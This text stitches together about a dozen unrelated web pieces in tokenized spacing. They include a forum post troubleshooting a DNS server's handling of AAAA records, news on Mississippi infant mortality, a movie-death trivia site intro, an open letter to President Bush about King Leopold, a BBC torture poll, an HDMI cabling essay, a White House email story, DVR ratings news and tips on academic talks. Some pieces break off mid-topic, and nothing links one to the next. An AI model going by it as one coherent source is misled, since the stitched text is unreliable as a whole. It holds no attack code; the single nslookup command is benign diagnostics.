So the problem is being triggered by the Unix boxes defaulting to trying IP v6 first ... so much for progessive thinking .
I check to see if some other IP v6 sites have the same behaviour .
They do n't .
So what 's so funky about ftp.perl.org 's AAAA record ?
$ nslookup > set type =AAAA > ftp.perl.org
Server : 10.0.0.53 Address : 10.0.0.53#53
Non-authoritative answer : ftp.perl.org canonical name = ftp.cpan.ddns.develooper.com . [ download ]
Notice anything missing ?
That 's right , there 's no actual IP address there .
And ftp.cpan.ddns.develooper.com .
has no AAAA record at all .
Apparently this causes our particular DNS to freak out and refuse to even try to look up the domain until that entry falls out of the cache .
Always the Last to Know
Thus armed , I cast my google net and found CERT Vulnerability # 714121 from 2003 :
Some DNS servers respond with an inappropriate error message if queried for nonexistent AAAA records , which can lead to possible denial of service .
And indeed , pointing the systems at an external DNS ( not running our out - of - date software ) showed that the problem disappeared .
Check and mate .
The travails of getting the corporate DNS updated are a horror story not fit for the polite company of the Monastery .

HOLLANDALE , Miss . —
For decades , Mississippi and neighboring states with large black populations and expanses of enduring poverty made steady progress in reducing infant death .
But , in what health experts call an ominous portent , progress has stalled and in recent years the death rate has risen in Mississippi and several other states .
The setbacks have raised questions about the impact of cuts in welfare and Medicaid and of poor access to doctors , and , many doctors say , the growing epidemics of obesity , diabetes and hypertension among potential mothers , some of whom tip the scales here at 300 to 400 pounds .
“ I do n’t think the rise is a fluke , and it ’s a disturbing trend , not only in Mississippi but throughout the Southeast , ” said Dr. Christina Glick , a neonatologist in Jackson , Miss . , and past president of the National Perinatal Association .
To the shock of Mississippi officials , who in 2004 had seen the infant mortality rate — defined as deaths by the age of 1 year per thousand live births — fall to 9.7 , the rate jumped sharply in 2005 , to 11.4 .
The national average in 2003 , the last year for which data have been compiled , was 6.9 .
Smaller rises also occurred in 2005 in Alabama , North Carolina and Tennessee .
Louisiana and South Carolina saw rises in 2004 and have not yet reported on 2005 .
Welcome to

Cinemorgue
From time to time , I 've noticed a couple of questions that come up in movie trivia
discussions : " Has so - and - so ever gotten killed in any movies ? " and " What 's that
movie where what ' sisname kills such - and - such ? "
This site will attempt to answer
those questions for most of the so - and - so's , what 'sisnames and such - and - suches .
( I 've even started listing voice - over performances in animated death scenes . )
From the index below , click on the performers ' names to see a list of movies in
which they died , with a brief description of the death scene .
( As a note of
clarification :
When I say " reportedly " in my descriptions , I do n't mean to cast doubt
on the accuracy of the information ; it 's just to differentiate the ones I 've seen for
myself .
From now on , I 'll just dispense with the " reportedlys . " )
I 'm trying to include
the famous and the obscure alike , so if you 're not familiar with the performer , you
can view a list of credits ( courtesy of the IMDb ) by clicking on their name .
( Another clarification : the various " Nudity Alerts " only indicate if there 's nudity
during the death scene ; the absence of an alert does n't mean that there 's no nudity
elsewhere in the movie . )
Obviously , since this site reveals who dies in which movies ( plus , in many cases , the
killer 's identity ) , the entire site is one huge SPOILER .

Video Games and Sex .
In recent years , it seems like the two have been going together like peanut butter and jelly .
Grape jelly .
With recent titles such as " Dead or Alive Xtreme Beach Volleyball " and " BMX XXX " , it 's obvious that sex sells ... especially to horny little gamer geeks .
Back in the day , however , this was not quite the case .
Well , at least not intentionally ... most of the time .
In the golden age of video games , there was n't a whole lot of blatant sexual stuff in games .
Unless of course you had a copy of " Leisure Suit Larry " - then you probably got a rare glimpse of that oh - so - naughty pixel that was supposed to represent a nipple .
Still , for the average gamer , there was n't a whole hell of a lot of sexual innuendo in the majority of games out there unless you looked really , really hard .
Fortunately , we 've decided to save you the trouble of searching for the the more obscure dirty little bytes in the wee hours of the night .
Unlike other sites which try to force sexual situations in video games , we 're scouring tons of classic games for those moments which require no alterations .
Moments that simply exist in the games to disturb you .
Enjoy our list of some of the top sexual moments in video game history !
It 's a work in progress , so if you have a game that you think we should include on the list , by all means let us know !

DEAR MR .
PRESIDENT :
Your interview in the Washington Post made headlines across the country Wednesday because you continued to talk about “ victory ” in Iraq — a hint that you may increase the number of American troops there .
But it caught my eye for a different reason .
In it ( after expressing some “ befuddlement ” at the suggestion that you do not read books ) , you explained that the most recent book you read was “ King Leopold ’s Ghost , ” about the plundering of Congo a century ago .
This pleased me because I wrote that book .
Sometimes college history classes that read “ King Leopold ’s Ghost ” invite me in for a seminar .
Before you ask Karl to call me , however , let me just say that I regret that I ’m not going to be able to do that in this case .
The Christmas season is a busy time , after all , and I ’m going away for a while .
Instead , let me just raise a few follow - up questions with you here .
First , as you now know , the long effort by King Leopold II of Belgium to bring Congo under his control was driven by his avid quest for a commodity central to industry and transportation : rubber .
Does that remind you of anything ?
What ’s more , the king justified his grab for Congo ’s natural resources with much talk about bringing philanthropy and Christianity to darkest Africa .
Now what did that remind you of ?
Leopold cleared at least $ 1.1 billion in today ’s dollars during the 23 years he controlled Congo , and his businessmen friends made additional huge sums .
Much of the money flowed into companies with special royal concession rights to exploit the rain forest .
Final question , for extra credit :
Do those companies remind you of anything ?
If you mentioned Halliburton or DynCorp , you ’re right again .
As a reader of history , you must have been interested , I ’m sure , in something else in the Congo story : the case of another world leader facing his own Abu Ghraib scandal .
As you noticed , Mr. President , King Leopold II was a master of public relations .
He was really his own Karl Rove — which saved money on staff salaries at the royal palace in Brussels .
For years the press at home and abroad dutifully praised his efforts to bring “ civilization ” to Africa ; a whole shipload of Belgian journalists went to Congo in 1898 to enthuse about the opening of a new railroad .
But , like you , he got into big trouble through photographs .
These were mainly taken by a British missionary named Alice Harris , and they showed Congolese being whipped , chained as hostages and with their hands cut off by Leopold ’s soldiers .
Through the efforts of a British journalist named Edmund Dene Morel , whom the king liked about as much as you like Seymour Hersh , these photos were splashed on front pages all over the world .
ARE THERE OTHER similarities between your situation and Leopold’s ?
That ’s for you to decide .
I hope you do n’t end up like him .
Statues of Leopold in Congo have long been toppled , one in Belgium was recently mutilated , and streets named after him there are having their names changed .
And all this despite the fact that his family remains in the monarchy — something that may well be the case for your family here as well .
If you send those additional troops to Iraq and do n’t swiftly withdraw the ones now there , I suspect that even the efforts of the twins , when their turns in the Oval Office come , or of Jeb ’s kids , when they get there , will not be enough to stave off a similar judgment on you 100 years from now .
It ’s true that you ’ve not slashed the population of Iraq in half , as Leopold and those who immediately followed him did in Congo , but that ’s small comfort .
For your next assignment , Mr. President , how about a different sort of reading ?
Ask Laura to stuff your Christmas stocking with books about people who ’ve had the courage to change their minds .
One former tenant of the house you live in , Lyndon B. Johnson , entered politics as a traditional segregationist but ended up doing more for civil rights than any American president of his century .
Another , Dwight D. Eisenhower , spent half his life in the U.S. military but gave us ( a little late ) an eloquent warning about the military - industrial complex .
Another ex-military man , Maj. Gen. Smedley Butler of the U.S. Marine Corps , won the Medal of Honor twice , but then ended up denouncing the oil companies and agribusiness corporations he realized that he had been fighting for in U.S. interventions in Central America .
History is filled with such people , and I wish you many inspiring hours reading about them .
And , in the coming two years , I hope you ’ll act on their example .
The Evolution of Information Grazing
One lens through which to look at the recent innovation in the memetracker space is frustration .
If you look at where the frustration is in how we track memes ( ideas ) , you can get a decent picture of where the innovation is going .
If you want to predict the future , find the frustration !
Like an antelope eating grass on the Kalahari , grazing is eating small quantities of food at frequent but irregular intervals ( Apple Dashboard dictionary ) .
Recently , the term grazing has been adopted to describe our efforts at finding information on the Web .
The following is a very general picture of the four types of “ grazing ” we ’ve gone through , or are going through now .
Each level had it ’s own share of frustration , which led ( or is leading ) directly to the next level .
Update : James Corbett disagrees completely .
Update # 2 : Well , not completely .

Each level had it ’s own share of frustration , which led ( or is leading ) directly to the next level .
Site Grazing
Site grazing is typing in URLs to see if there is any new content .
The URLs often come from a list of bookmarks or memory .
This difficulty was noticed early on in the blogging world by Rebecca Blood , who says that even as early as 1999 it was too difficult to read all blogs :
“ At this point , the bandwagon jumping began .
More and more people began publishing their own weblogs .
I began mine in April of 1999 .
Suddenly it became difficult to read every weblog every day , or even to keep track of all the new ones that were appearing . ”
The frustration with site grazing is what led to the popularity of RSS , as it immediately relieved the need to visit sites over and over without knowing if something was new .
Feed Grazing
Feed grazing is what most of us do in our feed readers : checking a bunch of feeds to see if there is anything new .
Usually the reader notifies us of new content , by either starring the content or sorting it based on newness , or both .
In my feed reader , Shrook , the feeds that have been updated more recently are presented first .
The feeds that have n’t been updated are pushed to the bottom .
Whereas site grazing is a bunch of HTML urls , feed grazing is a bunch of RSS urls .
So feed grazing works at the feed level .
A feed list is often called a Reading List , and is captured in an OPML file .
Here is my reading list .
The frustration with feed grazing is that we soon have too many feeds , and many of the feeds overlap content .
Ironically , however , we still want to add more feeds if they are relevant to us , and so we prune our feed list over time .
Grazing Lists :
These are a variation of feed grazing , and where the term “ grazing ” came into play via James Corbett .
( obviously , I think that grazing is a great term to describe all of these levels )
Anyway , a grazing list is a dynamically updated feed list like the one that Adam Green has created out of the tech .
memeorandum site .
In this paradigm , you subscribe to a Reading List that dynamically changes over time , so that you never know what feeds will be on it .
The frustration with grazing lists is that it is unclear as to why feeds are in the list .
Is it because the feeds themselves are about the hot topics of the day , or because they happened to have one good post in them ?
Adam , on the other hand , likes to use them to discover interesting feeds .
Post Grazing
I would say post grazing is getting nearer our end goal .
It is grazing for the latest , most interesting posts , regardless of what feed they come from .
Right now , there are a few services out there putting out feeds with which we can post - graze , such as tech .
memeorandum , Tailrank , and Findory .
As I was telling Kevin Burton of Tailrank the other day , I ’m completely in awe of folks who create these services : Gabe , Kevin , and Greg , in this case .
Each of these services offers different levels of relevance , and clustering .
As far as I can tell , the service that provides the best solution along these lines will certainly gain a strong following , at least from the tech bloggers I read .
Relevance Relevance is the make or break of these services .
Many of them use a link - counting method to find the most talked - about content , often combining that with some measure of authority to present the most relevant information .
Clustering Clustering is extremely important because otherwise the content becomes an echo chamber .
It is very useful to have related posts clustered so that we do n’t see the same news over and over .
Just this morning I read that Google bought Measuremap in about 85 different places .
Enough !
To use an analogy from offline , post grazing is similar to reading a big - time paper , which filters news from various news organization ( Reuters , AP , etc ) in addition to their own content .
They are getting those stories that are of the most interest and providing a one - stop place to read them .
When you move from one paper to another , however , you realize that there are different filters , and that each has it ’s own strengths and weaknesses .
For example , Fox News is a completely different filter than is NPR .
So there is a level of editorial as well .
So then another frustration sets in , you do n’t know what editorial is being applied to the filter you ’re looking at .
Instead , we want news that is filtered by ourselves , or based on our needs .
Personalized Post Grazing
I think this is the golden path .
This is when we get post - level news recommended to us based on our personal preferences and reading behavior .
The three services I mentioned above are moving in this direction , but as this comment thread on Scoble ’s site shows , they are not quite there yet .
( this is a * great * thread , if you consider how it might change the way that we read news ) .
( hat tip – Father Richard )
So , in addition to working at the post - level , this works at the personal level .
Combine what the group has found to be valuable to what the person has found valuable in the past , and you get a great sense of what might be valuable to the person in the future .
The Evolution of Grazing
However , there may still be frustrations at the personal post level as well .
One is our changing tastes .
What if we track tech news for years and then find ourselves burnt out , and yearning for a different kind of news ?
What if we do n’t feel that we ’re discovering enough diversity in our personal recommendations … what if we feel like we ’re missing out ?
With every level that we reach , we ’re happy for only a short period of time .
We will continue to want increased efficiency , and increased denseness of information .
The use of torture is controversial , but widespread
Although 59 % were opposed to torture , 29 % thought it acceptable to use some degree of torture to combat terrorism .
While most polled in the US are against torture , opposition there is less robust than in Europe and elsewhere .
More than 27,000 people in 25 countries were asked if torture would be acceptable if it could provide information to save innocent lives .
Some 36 % of those questioned in the US agreed that this use of torture was acceptable , while 58 % were unwilling to compromise on human rights .
The percentage favouring torture in certain cases makes it one of the highest of all the countries polled .
The majority of those questioned in the BBC World Service poll - 19 of the 25 countries surveyed - agree that clear rules against torture in prisons should be maintained because it is immoral and its use would weaken human rights standards .
" The dominant view around the world is that terrorism does not warrant bending the rules against torture , " said Steven Kull , director of the Program on International Policy Attitudes ( PIPA ) , whose organisation helped conduct the survey .
Saving lives ?
All of the countries surveyed have signed up to the Geneva Conventions which prohibit the use of torture and cruel and degrading behaviour .
HAVE YOUR SAY
We are judged by how we treat our enemies rather than how we treat our friends

Israel has the largest percentage of those polled endorsing the use of a degree of torture on prisoners , with 43 % saying they agreed that some degree of torture should be allowed .
However , a larger percentage - 48 % - think it should remain prohibited .
The question Most countries have agreed to rules prohibiting torturing prisoners .
Which position is closer to yours ?
Terrorists pose such an extreme threat that governments should now be allowed to use some degree of torture if it may gain information that saves innocent lives Clear rules against torture should be maintained because any use of torture is immoral and will weaken international human rights
World split on torture ethics
Other countries that polled higher levels of acceptance of the use of torture include Iraq ( 42 % ) , the Philippines ( 40 % ) , Indonesia ( 40 % ) , Russia ( 37 % ) and China ( 37 % ) .
The Israeli figure conceals a stark difference in attitude within the country , split along religious lines .
A majority of Jewish respondents in Israel , 53 % , favour allowing governments to use some degree of torture to obtain information from those in custody , while 39 % want clear rules against it .
But Muslims in Israel , who represent 16 % of the total number polled , are overwhelmingly against any use of torture .
Meanwhile opposition to the practise is highest in Italy , where 81 % of those questioned think torture is never justified .
Australia , France , Canada , the UK and Germany also registered high levels of opposition to any use of torture .
The survey was carried out for the BBC World Service by polling firm Globescan and the Program on International Policy Attitudes ( PIPA ) .
How the designers of the HDMI standard screwed up , and what 's to be done about it .
HDMI , as we 've pointed out elsewhere , is a format which was designed primarily to serve the interests of the content - provider industries , not to serve the interests of the consumer .
The result is a mess , and in particular , the signal is quite hard to route and switch , cable assemblies are unnecessarily complicated , and distance runs are chancy .
Why is this , and what did the designers of the standard do wrong ?
And what can we do about it ?
The story begins with another badly - developed standard , DVI .
A few years ago , there was a movement within the computer industry to develop a new digital video display standard to replace the traditional analog VGA / RGBHV arrangement still found on most computer video cards and monitors .
Interested parties grouped together to form the Digital Display Working Group ( DDWG ) , which developed the DVI standard .
DVI had all the earmarks of a standard designed by committee , and it remains one of the most confusing video interfaces ever .
DVI could run analog signals , digital signals , or both , and it could run digital signals either in a single - link configuration ( in a cable using four twisted pairs for the signal ) , or in a dual - link configuration ( using seven ) .
Identifying which DVI standard or standards any particular device supported was not always easy , and the DVI connector came in various flavors and was never really manufactured in any form that was n't well - nigh impossible to terminate .
But the worst thing about DVI was something that the computer - display professionals involved in its development really did n't give much thought to : distance runs .
Most computer displays are mounted at most a few feet away from the CPU , so it did n't seem imperative that DVI work well over distance .
This lack of concern for function at a distance , coupled with common use of twisted - pair cable ( e.g. , CAT 5 ) in computer interconnection , led to a decision that DVI would be run in twisted - pair cable .
Had the DVI standard been designed by broadcast engineers rather than computer engineers , things probably would have turned out very differently .
In the broadcast world , everything from lowly composite video to High - Definition Serial Digital Video is run in coaxial cables , and for good reasons , which we 'll get to in a bit .
Long - distance runs of VGA , in fact , are always handled in coaxial cable ( though there may be a number of miniature coaxes in a small bundle , rather than something which obviously appears to be coax ) .
DVI lacked a couple of things which the consumer audio / video industry wanted .
It was implemented on a variety of HD displays and source devices , but it was confusing for the consumer because of the many variants on the standard and different connector configurations , and it did n't carry audio signals .
A consortium to develop and promote a new interface , HDMI , was formed ; the idea was to come up with a standard which could be implemented more uniformly , was less confusing , and offered the option of routing audio signals along with video .
Here , again , was an opportunity to avoid problems .
The difficulties of running DVI - D signals over long distances were well known , and the mistakes of the past could have been avoided by developing HDMI as a wholly new standard , independent of DVI .
Instead , the HDMI group elected to modify the DVI standard , using the same encoding scheme and the same basic interface design , but adding embedded audio and designing a new plug .
Instead of many DVI options , analog , digital , single and dual link , there was one " flavor " of HDMI ( actually , there is also a dual - link version in the HDMI spec -- but you wo n't find it implemented on any currently available device ) .
This provided the advantage of making HDMI backward - compatible with some existing DVI hardware , but it locked the interface into the electrical requirements of the DVI interface .
Specifically , that means that the signals have to be run balanced , on 100 ohm impedance twisted pairs .
We 're often asked why that 's so bad .
After all , CAT 5 cable can run high - speed data from point to point very reliably -- why can't one count on twisted - pair cable to do a good job with digital video signals as well ?
And what makes coax so great for that type of application ?
First , it 's important to understand that a lot of other protocols which run over twisted - pair wire are two - way communications with error correction .
A packet that does n't arrive on a computer network connection can be re-sent ; an HDMI or DVI signal is a real - time , one - way stream of pixels that does n't stop , does n't error - check , and does n't repair its mistakes -- it just runs and runs , regardless of what 's happening at the other end of the signal chain .
Second , HDMI runs fast -- at 1080 p , the rate is around 150 Megapixels / second .
CAT5 , by contrast , is rated at 100 megabits per second -- and that 's bits , not pixels .
Third , HDMI runs parallel , not serially .
There are three color signals riding on three pairs , with a clock circuit running on the fourth .
These signals can't fall out of time with one another , or with the clock , without trouble -- and the faster the bitrate , the shorter the bits are , and consequently the tighter the time window becomes for each bit to be registered .
Consider , by contrast , what the broadcast world did when it needed to route digital video from point to point .
The result was HD - SDI , high - definition serial digital interface .
One coaxial cable can route an HD SDI signal hundreds of feet without errors , with no repeater hardware or EQs in the line .
Had the consumer industry opted for a coaxial - based standard , we'd be able to do the same in our homes .
Admittedly , few of us need to make 300 - foot runs ; but the ability to run 300 feet without problems would be accompanied by rock - solid certainty of being able to do 50 , or 75 , without any worry at all .
But why is there such a big difference between twisted pairs and coax ?
It all has to do with the electrical properties of the two methods of routing signal from one place to another : balanced , through twisted pair , and unbalanced , through coax .
We tend to assume , when thinking about wire , that when we apply a signal to one end of a wire , it arrives instantaneously at the other end of that wire , unaltered .
If you 've ever spent any time studying basic DC circuit theory , that 's exactly the assumption you 're accustomed to making .
That assumption works pretty well if we 're talking about low - frequency signals and modest distances , but wire and electricity behave in strange and counterintuitive ways over distance , and at high frequencies .
Nothing in this universe -- not even light -- travels instantaneously from point to point , and when we apply a voltage to a wire , we start a wave of energy propagating down that wire which takes time to get where it 's going , and which arrives in a different condition from that in which it left .
This is n't important if you 're turning on a reading lamp , but it 's very important in high - speed digital signaling .
There are a few considerations that start to cause real trouble :
Time : electricity does n't travel instantaneously .
It travels at something approaching the speed of light , and exactly how fast it travels depends upon the insulating material surrounding the wire .
As the composition and density of that insulation changes from point to point along the wire , the speed of travel changes .
Resistance : electricity burns up in wire and turns into heat .
Skin effect : higher frequencies travel primarily on the outside of a wire , while lower frequencies use more of the wire 's depth ; this means that higher frequencies face more resistance , and are burned up more rapidly , than lower frequencies .
Capacitance : some of the energy of the signal gets stored in the wire by a principle known as " capacitance , " rather than being delivered immediately to the destination .
This smears out the signal relative to time , making changes in voltage appear less sudden at the far end of the wire than they were at the source .
This phenomenon is frequency - dependent , with higher frequencies being more strongly affected .
Impedance : if the characteristic impedance of the cable does n't match the impedance of the source and load circuits , the impedance mismatch will cause portions of the signal to be reflected back and forth in the cable .
The same is true for variations in impedance from point to point within the cable .
Crosstalk : when signals are run in parallel over a distance , the signal in one wire will induce a similar signal in another , causing interference .
Inductance : just as capacitance smears out changes in voltage , inductance -- the relationship between a current flow and an induced electromagnetic field around that flow -- smears out changes in the rate of current flow over time .
Impedance , in particular , becomes a really important concern any time the cable length is more than about a quarter of the signal wavelength , and becomes increasingly important as the cable length becomes a greater and greater multiple of that wavelength .
The signal wavelength , for one of the color channels of a 1080 p HDMI signal , is about 16 inches 1 , making the quarter - wave a mere four inches -- so impedance is an enormous consideration in getting HDMI signals to propagate along a cable without serious degradation .
Impedance is a function of the physical dimensions and arrangement of the cable 's parts , and the type and consistency of the dielectric materials in the cable .
There are two principal sorts of cable " architecture " used in data cabling ( and HDMI , being a digital standard , is really a data cable ) , and each has its advantages .
First , there 's twisted - pair cable , used in a diverse range of computer - related applications .
Twisted - pair cables are generally economical to make and can be quite small in overall profile .
Second , there 's coaxial cable , where one conductor runs down the center and the other is a cylindrical " shield " running over the outside , with a layer of insulation between .
Coaxial cable is costlier to produce , but has technical advantages over twisted pair , particularly in the area of impedance .
It 's impossible to control the impedance of any cable perfectly .
We can , of course , if we know the types of materials to be used in building the cable , create a sort of mathematical model of the perfect cable ; this cable has perfect symmetry , perfect materials , and manufacturing tolerances of zero in every dimension , and its impedance is fixed and dead - on - spec .
But the real world wo n't allow us to build and use this perfect cable .
The dimensions involved are very small and hard to control , and the materials in use are n't perfect ; consequently , all we can do is control manufacturing within certain technical limits .
Further , when a cable is in use , it can't be like our perfect model ; it has to bend , and it has to be affixed to connectors .
So , what do we get instead of perfect cable , with perfect impedance ?
We get real cable , with impedance controlled within some tolerance ; and we hope that we can make the cable conform to tolerances tight enough for the application to which we put it .
As it happens , some types of impedance variation are easier to control than others , so depending on the type of cable architecture we choose , the task of controlling impedance becomes harder or easier .
Coaxial cable , in this area , is clearly the superior design ; the best precision video coaxes have superb bandwidth and excellent impedance control .
Belden 1694A , for example , has a specified impedance tolerance of +/- 1.5 ohms , which is just two percent of the 75 ohm spec ; and that tolerance is a conservative figure , with the actual impedance of the cable seldom off by more than half an ohm ( 2/3 of one percent off - spec ) .
Twisted pair does not remotely compare ; getting within 10 or 15 percent impedance tolerance is excellent , and the best bonded - pair Belden cables stay dependably within about 8 ohms of the 100 ohm spec .
If we were running a low bit - rate through this cable , it would n't really matter .
Plus or minus 10 or 15 ohms would be " good enough " and the interface would work just great .
But the bitrate demands placed on HDMI cable are severe .
At 1080i , the pixel clock runs at 74.25 MHz , and each of the three color channels sends a ten - bit signal on each pulse of the clock , for a bitrate of 742.5 Mbps .
What 's worse , some devices are now able to send or receive 1080p / 60 , which requires double that bitrate .
Impedance mismatch , at these bitrates , causes all manner of havoc .
Variations in impedance within the cable cause the signal to degrade substantially , and in a non-linear way that can't easily be EQ'd or amplified away .
The result is that the HDMI standard will always be faced with serious limitations on distance .
We have found that , at 720 p and 1080i , well - made cables up to around 50 feet will work properly with most , but not all , source / display combinations .
If 1080 p becomes a standard , plenty of cables which have been good enough to date will fail .
And it gets worse ...
In June 2005 , the HDMI organization announced the new HDMI 1.3 spec .
Among other things , the 1.3 spec offers new color depths which require more bits per pixel .
The HDMI press release states :
" HDMI 1.3 increases its single - link bandwidth from 165MHz ( 4.95 gigabits per second ) to 340 MHz ( 10.2 Gbps ) to support the demands of future high definition display devices , such as higher resolutions , Deep Color and high frame rates . "
So , what did they do to enable the HDMI cable to convey this massive increase in bitrate ?
If your guess is " nothing whatsoever , " you 're right .
The HDMI cable is still the same four shielded 100 - ohm twisted pairs , still subject to the same technical and manufacturing limitations .
And do n't draw any consolation from those modest " bandwidth " requirements , stated in Megahertz ; those numbers are the frequencies of the clock pulses , which run at 1/10 the rate of the data pairs , and why the HDMI people chose to call those the " bandwidth " requirements of the cable is anyone 's guess .
The only good news here is that the bitrates quoted are the summed bitrates of the three color channels -- so a twisted pair 's potential bandwidth requirement has gone up " only " to 3.4 Gbps rather than 10.2 .
What 's to be Done ?
It 's unlikely , given the wholehearted way in which the consumer electronics industry has embraced HDMI , that this interface will disappear anytime soon .
We 're stuck with it .
Given that that 's so , what can a person do to avoid problems with video dropouts and outright signal failure ?
First , limiting run lengths is a good idea whenever it can be done .
If you do n't need to put your sources at one end of the room and the display at the other , by all means avoid doing so .
Second , if run lengths can't be limited , consider relying on analog component or RGBHV signals for your distance runs ; these formats are much more robust ( in large part because they run in coax rather than in twisted pairs ) and can be run hundreds of feet .
Third , eliminating unnecessary switches , couplers , and adapters may help ; as bad as the impedance mismatch problems are in the cable itself , those problems are even worse when the cable 's conductors must be split out to join to a connector , or when the signal must travel through connections that can't be kept at 100 ohms .
Fourth , there are some things that can be done in cable design , and we 're on the task .
In particular , though the impedance of pairs can be controlled only to a limited degree , there are some things which the Chinese ( who , as of this writing , manufacture all of the HDMI cable sold by anyone , anywhere , under any brand name ) do not have the technical capacity to do but which American manufacturers do , and which help address the problem .
Belden has a patented " bonded pair " technology which involves molding twisted pairs together rather than simply twisting them , and which was developed specifically to address the problem of running high bitrates through twisted pairs .
Beginning in 2005 , we consulted with Belden on construction of such a cable for use in HDMI applications and in 2006 , Belden built a series of sample reels of cable for us in its engineering lab .
Our in -use testing has shown the cable working at 150 feet at ordinary high - definition resolutions ( 720 p , 1080i ) and up to 180 feet at 480 p .
Electrical tests of the cable indicate that it should be good for 1080 p at a greater distance than any cable currently on the market .
The cable has been ordered for full - scale production and should be available on our site around the very end of June or the first half of July 2007 .
Many thanks tofor providing this article for our site .
1 . This is the wavelength " in air , " i.e. , as though the signal were propagating at the speed of light .
Since cable will always have some type of dielectric material around the wires , the wavelength is actually shorter still ; for solid polyethylene , the wavelength would be about 2/3 of this measure .

The hidden scandal in the administration ’s already scandalous purge of eight U.S. Attorneys is the discovery that White House officials have been regularly communicating using nongovernmental email addresses , some of them administered by the Republican National Committee .
As we reported a couple weeks ago , this seems a blatant attempt to prevent emails from being archived by the White House computer system and potentially flouts the Presidential Records Act , a law enacted after Watergate to ensure that the papers of presidents and their advisor ’s are adequately preserved ( and eventually made available to the public ) .
Now that congressional investigators are turning up the heat on the White House to explain this practice and Henry Waxman has asked the RNC to preserve White House communications archived on its servers , the email controversy is “ creating new embarrassment and legal headaches for the White House , ” the Los Angeles Times reports .
The paper explains that this “ back - channel e-mail and paging system , paid for and maintained by the RNC , was designed to avoid charges that had vexed the Clinton White House — that federal resources were being used inappropriately for political campaign purposes . ”
Perhaps , but that ’s just one part of the story .
There ’s evidence to suggest that White House officials are n’t simply concerned with separating their political and policy duties .
As U.S. News & World Report noted in a brief item in 2004 , White House staffers have turned to Web - based email accounts specifically to keep their emails from entering the public record .
“ I do n’t want my E - mail made public , ” one White House “ insider ” told the magazine .
Not only did White House officials think better of using their official emails , they also instructed the lobbyists who did business with them to avoid the White House system .
“ … It is better to not put this stuff in writing in their email system because it might actually limit what they can do to help us , especially since there could be lawsuits , etc. , ” one lobbyist to wrote to Jack Abramoff in August 2003 after Abramoff accidentally pinged former Karl Rove aide Susan Ralston on her White House address .
“ Dammit .
It was sent to Susan on her rnc [ Republican National Committee ] pager and was not supposed to go into the WH system , ” Abramoff replied .
The White House is trying to play down the controversy , spinning the use of outside email addresses as an honest effort to avoid breaching the Hatch Act , which prohibits most federal employees from engaging in political activity on the job .
But here ’s the thing : Staffers whose salaries are paid from an appropriation for the Executive Office of the President are exempt from certain strictures of that law and are allowed to conduct political business .
That is , under most circumstances , White House officials would have no need to use alternate email addresses when talking politics .
Overshadowed by the U.S. Attorney firings , the email controversy has received scant media attention .
But it ’s the email scandal , with its potential to pull back the curtain on the White House ’s political operation and possibly unveil other scandals , that really has the GOP ’s teeth chattering .
According to the Times :
Some Republicans believe that the huge number of e-mails — many written hastily , with no thought that they might become public — may contain more detailed and unguarded inside information about the administration ’s far - flung political activities than has previously been available .
One “ GOP activist , ” in what seems a vast understatement , told the paper , “ There is concern about what may be in these e-mails . ”
Nielsen announced the data as part of its preparations to release commercial viewing numbers for every TV program , starting in May .
Nielsen , which collects data every few seconds through its set - top boxes , added DVR households to its sample in the last year ; its commercial ratings data reflects the total time viewers spend watching ads , including viewing of partial ads , rather than whether ads are watched from start to finish .
Advertisers spent upward of $ 70 billion last year for their TV spots — more than in any other type of media .
“ The cable operators that have the subscribers , the programmers who have the content and the marketers have to get ahead of this , ” said Curt Hecht , chief digital officer at GM Planworks , the part of the Starcom MediaVest Group that manages General Motors ’ ad buying .
“ They need to figure out how advertising can remain sustainable and effective in the new landscape . ”
Advertising and television executives have not yet figured out which DVR owners are more likely to be commercial skippers , though Nielsen has found that younger people generally skip more commercials and time - shift more of their viewing than older people .
Nielsen has also found that commercials are more often watched during playback if the viewer is looking at the show the same day it ran .
Commercial viewing drops significantly over time after the original showing .
If advertisers start paying for DVR viewing , one question is whether they will pay just when viewers play back shows within a few hours .
Without DVRs , people can , of course , change the channel , leave the room or not pay attention during commercial breaks , but those activities seem to have only a minor effect on ratings during commercials — only 5 percent , according to Nielsen data .
“ DVRs are really the big X factor going forward , ” said Brad Adgate , senior vice president for research at Horizon Media , an ad - buying agency .
“ People ’s DVR behavior is going to drive the marketplace . ”
DVRs , which were introduced in 1999 , are becoming more popular every year , and the cable operators are increasingly offering the feature in new set - top box packages .
Analysts say DVRs are now in 12 to 20 percent of households .
DVR owners tend to be wealthier and more educated than the average TV owner .
DVR owners tend to have more children , and some own more than one DVR .

Giving an Academic Talk
Jonathan Shewchuk
[ An Italian translation is here . ]
These are my opinions on how to give a talk ( using presentation software or transparencies ) in computer science or mathematics , distilled for my students and for students attending Graphics Lunch .
I go to conferences , see the same mistakes repeated by many a speaker , and write my reactions here .
You are welcome to disagree with my opinions , as long as you think each issue through for yourself .
Preparing the talk
Recall the last talk you gave .
I bet you made the same mistake .
Ask yourself : why are you projecting a slide that virtually guarantees that your audience will stop listening to you ?
If you expect them to listen , why are you showing slides that they wo n't have time to read ?
Like circumcision or Christmas fruitcake , we do it out of tradition , not because it is n't nasty .
If you want to be a great speaker , you must first accept the fact that a slide with more than twelve words on it is usually counterproductive .
Next , accept that this means you will have to prepare harder than the 99 % of your colleagues who are still babbling to fill the time while the audience puzzles over their slides .
How do you stamp out those excess words ?
First , your new modus operandi is to express all your ideas in pictures .
Resort to text only where illustrations fail you .
As an exercise , try to make a talk where the only text is the slide titles , and perhaps a few two - word labels on figures .
Even if you do n't quite succeed ( I never do ) , you 'll learn a lot about presentation by trying .
Second , examine your unconscious belief that the purpose of slides is to remind you what to say .
Once upon a time , speakers prepared index cards .
Today , speakers project their index cards ( as a list of bullet points ) and make their audiences read them .
Please understand that this is a hostile act .
Go back to index cards .
Some presentation programs let you write notes that appear only on your laptop screen .
As an exercise , imagine this scenario .
You are projecting a slide that has nothing but a title , say “ Advantages of Matrix Projection . ”
You have in your hand ( or on your laptop screen , but not on the big screen ) a list reminding you of all the points you want to make .
You simply talk to your audience , just like Abraham Lincoln delivering the Gettysburg Address .
Can you see how much better this is than bullet points ?
Now imagine if you had an apt illustration for each item on your list , and simply showed them ( under the same title ) one by one as you spoke .
In summary , minimize words and maximize pictures .
Your slides are not there to remind you what to say .
Bullet points make your audience feel your talk is in bullet time .
Here are a few other tips .
Most talks I attend use fonts that are too small .
Your academic colleagues are all nearsighted .
I use 38 point text and 42 – 50 point titles .
As wise speakers rarely put more than twelve words on a slide , there 's plenty of room .
Projected slides , unlike printed documents , do not need margins .
Yet most speakers put wide bands of empty space on the border of every slide .
